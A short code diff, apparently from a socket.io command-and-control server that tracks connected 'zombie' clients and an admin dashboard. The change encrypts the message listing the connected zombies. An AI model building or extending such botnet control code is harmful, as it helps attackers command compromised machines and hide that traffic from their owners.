@@ -1,5 +1,5 @@
 import { DefaultEventsMap, Server, Socket } from "socket.io";
-import { VeparServer } from "..";
+import { VeparServer, cryptoModule } from "..";
 import { single_zombie_commands, all_zombie_commands } from "../constants/commands";
 
 type Command = {
@@ -85,7 +85,7 @@ export default class CommandParser {
       return `${clientSocket.id} (${ip}) ${ip.includes(process.env.DASHBOARD_IP as string) ? '[ADMIN]' : '[ZOMBIE]'}`;
     });
 
-    socket.emit("message", clients.length === 0 ? "No clients connected." : `Connected clients: \n - ${clients.join("\n - ")}`);
+    socket.emit("message", cryptoModule.encrypt(clients.length === 0 ? "No clients connected." : `Connected clients: \n - ${clients.join("\n - ")}`));
   }
 
   /**
